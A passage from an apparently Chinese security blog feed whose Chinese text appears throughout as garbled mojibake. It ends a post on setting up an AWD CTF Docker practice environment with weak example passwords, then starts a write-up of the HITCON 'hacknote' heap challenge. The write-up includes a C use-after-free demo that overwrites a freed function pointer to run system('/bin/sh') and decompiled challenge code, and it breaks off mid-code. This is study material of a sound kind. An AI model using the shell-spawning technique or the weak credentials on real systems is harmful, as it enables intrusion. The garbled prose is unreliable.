pwné¢˜çš„binaryç¨‹åºå’Œflagï¼Œhtmlæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½®web_phpç¯å¢ƒçš„æºç ã€‚</p></blockquote><h2 id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>é…ç½®å¥½äº†Dockerfileï¼Œä»¥åŠbinæ–‡ä»¶å¤¹å’Œhtmlæ–‡ä»¶å¤¹åï¼Œéœ€è¦æ³¨æ„ctf_xinetdé…ç½®æ–‡ä»¶ä¸­çš„binaryç¨‹åºåéœ€è¦ä¸binæ–‡ä»¶å¤¹ä¸­çš„binaryç¨‹åºåä¿æŒä¸€è‡´ï¼Œè¿™ä¸ªå‚ç…§ctf_xinetdè¯´æ˜ä¹¦å³å¯ã€‚</p></blockquote><p>åˆ‡æ¢ç›®å½•åˆ°ä¸dockerfileåŒä¸€ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤:<code>docker build -t imagename .</code></p><p>å®ä¾‹ï¼š<code>docker build -t &quot;awd1test&quot; .</code></p><p>ç­‰å¾…dockerfileæ‰§è¡Œå®Œæ¯•ä¹‹åå°±å¾—åˆ°äº†ä¸€ä¸ªå®šåˆ¶çš„image:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>å¾—åˆ°å®šåˆ¶çš„imageåï¼Œå°±æ˜¯ç”Ÿæˆcontaineräº†ï¼š</p><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; awd1test</code></p><ul><li>18080:80è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„18080ç«¯å£</li><li>13306:3306è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„mysqlæœåŠ¡æ˜ å°„åˆ°ä¸»æœº13306ç«¯å£</li><li>10022:22è¡¨ç¤ºæ˜ å°„sshæœåŠ¡</li><li>19999:9999è¡¨ç¤ºæ˜ å°„pwné¢˜æœåŠ¡</li></ul></blockquote><p>æ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œé€šè¿‡<code>sudo docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„dockerçŠ¶æ€ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><blockquote><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>è¿›å…¥å®¹å™¨ã€‚</p></blockquote><p>è¿›å…¥å®¹å™¨ä¹‹åé¦–å…ˆï¼š</p><ul><li>é€šè¿‡<code>passwd</code>å‘½ä»¤è®¾ç½®rootç”¨æˆ·çš„å¯†ç ä»¥åŠawduserç”¨æˆ·çš„å¯†ç ï¼Œå¹¶ä¸”å¼€å¯sshè¿œç¨‹è¿æ¥æœåŠ¡ï¼Œä»¥ä¾¿è¿ç»´å’Œawdå‚èµ›è€…çš„è¿æ¥ã€‚</li><li>è®¾ç½®å®Œå¯†ç åå¼€å¯sshæœåŠ¡==&gt;<code>service ssh start</code>ã€‚</li><li>åˆå§‹çŠ¶æ€ï¼Œmysqlçš„rootè´¦æˆ·æ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¸ºrootæ·»åŠ å¯†ç <code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>ï¼Œåˆ†å‘ç»™å‚èµ›è€…çš„è´¦æˆ·ä¸ºadminï¼Œå¯†ç éšæœºç”Ÿæˆã€‚</li><li>è‹¥æœ‰mysqlæ•°æ®åº“éœ€è¦åŠ è½½ï¼Œåˆ™ä½¿ç”¨ç±»ä¼¼<code></code>source /var/www/html/web/tcho.sql;`å‘½ä»¤æ¥åŠ è½½sqlè„šæœ¬æ–‡ä»¶ã€‚</li><li>æ·»åŠ å‚èµ›è€…æ•°æ®åº“ç”¨æˆ·ï¼š<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>å…³äºå…·ä½“çš„webé¢˜ç¯å¢ƒå’Œpwné¢˜ç¯å¢ƒï¼Œè¯·è‡ªè¡Œæ›´æ”¹ç›¸å…³æ–‡ä»¶ã€‚</p><h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>è¿è¡Œèµ·æ¥çš„webæœåŠ¡ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" class="lazyload"></p><p>è¿è¡Œåœ¨åŒä¸€dockerå®¹å™¨å†…çš„pwn:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" class="lazyload"></p><blockquote><p>è™½ç„¶éå¸¸ç®€é™‹ï¼Œä½†æ˜¯ç”¨äºç»ƒä¹ è¿˜æ˜¯è¶³å¤Ÿçš„ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
            <tag> docker </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-11æœˆ02-Hitcon-å…­</title>
      <link href="/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
      <url>/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-11æœˆ02-Hitcon-å…­"><a href="#Pwn-11æœˆ02-Hitcon-å…­" class="headerlink" title="Pwn-11æœˆ02-Hitcon-å…­"></a>Pwn-11æœˆ02-Hitcon-å…­</h1><blockquote><p>è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿuafåˆæ˜¯ä»€ä¹ˆï¼Ÿåˆæ˜¯ä¸€é“æ¶¨å§¿åŠ¿çš„é¢˜å‘¢ã€‚å•Šå•Šå•Šä»è¿™å„¿å¼€å§‹å°±æ¥è§¦å †è¿™ç©æ„å„¿äº†ï¼ï¼ï¼</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">å †æº¢å‡ºå­¦ä¹ ä¹‹è·¯</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeï¼Œè·Ÿå­—é¢ä¸Šçš„æ„æ€ä¸€æ ·ï¼šç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨é‡Šæ”¾è¿‡åæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™å†æ¬¡ä½¿ç”¨è¯¥å†…å­˜å—ï¼Œä½¿å¾—ä»¥å‰çš„å†…å­˜æŒ‡é’ˆå¯ä»¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; é‚£é€šè¿‡UAFæ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¹²å˜›ï¼Œå½“ç„¶æ˜¯ç›´æ¥getshellï¼Œé€šè¿‡ä¸‹é¢ä¸€æ®µcç¨‹åºï¼Œè¿›è¡Œç¼–è¯‘å°±èƒ½getshelläº†ï¼ˆç¨‹åºä»£ç æ¥è‡ª<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nçš„åšå®¢</a> ï¼‰ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç¼–è¯‘è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binå‚è€ƒPDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack é€šå¸¸ä¸å †å—è”ç³»åœ¨ä¸€èµ·ï¼Œæ˜¯CTFä¸­å¸¸è§é¢˜å‹ã€‚</p><p>å®šä¹‰å¦‚ä¸‹ï¼š</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attackæ˜¯fastbinåœ¨å­˜å‚¨ç®¡ç†æ—¶ï¼Œä¸ºä¿è¯å¿«é€Ÿåˆ†é…ï¼Œå›æ”¶å†…å­˜çš„éœ€è¦ï¼Œåœ¨å†…å­˜ç®¡ç†çš„æœºåˆ¶ä¸­å‡ºç°çš„é—®é¢˜ï¼Œè¿›è€Œé€ æˆçš„æ¼æ´ï¼Œèƒ½å¤Ÿé€šè¿‡æ¼æ´æ”¹å†™main_arenaä¸Šçš„FasbinYæŒ‡é’ˆæ•°ç»„ï¼Œä»è€Œè·å¾—â€œç‰¹å®šâ€ï¼ˆéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼‰åœ°å€çš„å†™æƒé™ã€‚</p><p>è‡³äºmain_arenaï¼Œå°±å¼•ç”¨ä¸€ä¸‹stackoverflowçš„è§£é‡Šå’¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p><blockquote><p>main_arenaæ˜¯ä¸èƒ½å¯¼å‡ºçš„ä¸€ä¸ªæœ¬åœ°ç¬¦å·è¡¨ã€‚å¯¼å‡ºç¬¦å·åˆ—è¡¨éœ€è¦é€šè¿‡glibcæºä»£ç ç›®å½•ä¸­çš„Versionæ–‡ä»¶æ§åˆ¶ã€‚è¿™æ˜¯è®¾è®¡ç”¨äºé˜²æ­¢äººä»¬é“¾æ¥glibcå†…éƒ¨ä½¿ç”¨çš„éšæœºç¬¦å·ï¼Œï¼ˆæ‰€ä»¥ä¸ä¼šåƒPOSIXå’Œå…¶ä»–æ ‡å‡†é‚£æ ·æ±¡æŸ“å‘½åç©ºé—´ï¼‰ã€‚</p></blockquote><p>gdb can find it because you have debug symbols available â€¦ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdbå¯ä»¥æ‰¾åˆ°main_arenaï¼Œå› ä¸ºä½ å¯ä»¥è·å¾—ä¸€äº›è°ƒè¯•ç¬¦å·è¡¨â€¦å½“ç¨‹åºæ²¡æœ‰è¢«è„±è¡£æœ(not stripped)ï¼Œæˆ–è€…ä½ åœ¨<code>/ usr / lib / debug /</code>ä¸­æ‹†åˆ†è¿‡è°ƒè¯•ç¬¦å·ï¼Œè€Œgdbå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚å½“ä½ å¯åŠ¨gdbè¿›è¡Œè°ƒè¯•æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚<code>loading symbols from / usr / lib / debug / xxxxx</code>è¿™ç§è°ƒè¯•ä¿¡æ¯ã€‚</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>å”¯ä¸€èƒ½å¤Ÿé“¾æ¥åˆ°ç¬¦å·çš„æ–¹æ³•æ˜¯ä»æºé‡æ„GLIBCå¹¶ä¿®æ”¹å¯¼å‡ºåˆ—è¡¨ã€‚</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>æˆ–è€…ï¼Œä½ å¯ä»¥åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­ç¼–å†™ä¸€äº›ä»£ç æ¥åƒgdbè°ƒè¯•ä¸€æ ·ã€‚å³é€šè¿‡åº”ç”¨ç¨‹åºï¼Œæ‰“å¼€è°ƒè¯•æ–‡ä»¶ï¼Œå¤„ç†å…¶ä¸­çš„ELF / DWARFä¿¡æ¯ï¼Œä½¿ç”¨æ´»åŠ¨åŠ è½½çš„åº“ä¿¡æ¯åº”ç”¨é‡å®šä½ï¼ˆè¯·å‚é˜…dl_iterate_phdrï¼‰ï¼Œç„¶åç›´æ¥å¼€å§‹è°ƒç”¨å†…å­˜ã€‚</p></blockquote><p>if thatâ€™s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>å¦‚æœé‚£å¤ªè¿‡äºéº»çƒ¦ï¼Œé»‘å®¢ä¸€ç‚¹çš„è§£å†³æ–¹æ¡ˆå¯èƒ½æ˜¯<code>forkï¼ˆï¼‰+ popenï¼ˆï¼‰</code>gdbè°ƒè¯•ä½ è‡ªå·±çš„è¿›ç¨‹ï¼Œå¹¶ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œå®ƒæ¥è½¬å‚¨ç¬¦å·ä¿¡æ¯ã€‚</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>é‚£ä¹ˆå¼€å§‹åšé¢˜å§ï¼Œå…ˆchecksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ä»¥åŠæ ˆä¸å¯æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬ä»åˆ«çš„åœ°æ–¹å…¥æ‰‹ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>å…ˆç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" class="lazyload"></p><p>è¿™ç§noteç±»é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§äº†ã€‚ã€‚ã€‚å³ä½¿æˆ‘ä¸æ˜¯pwnå¸ˆå‚…ï¼Œæˆ‘ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œå½“ç„¶æ˜¯ä¸€è„¸æ‡µé€¼äº†ï¼ŒğŸ˜­ã€‚</p></blockquote><p>é€šè¿‡IDAé™æ€åˆ†æmainå‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªCä»£ç ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainå‡½æ•°</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//èœå•</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå¯¹è±¡</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ‰“å°å¯¹è±¡</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ·»åŠ note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>çœ‹çœ‹addå‡½æ•°ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆä¸ºnotelistç”³è¯·8å¤§å°çš„ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token 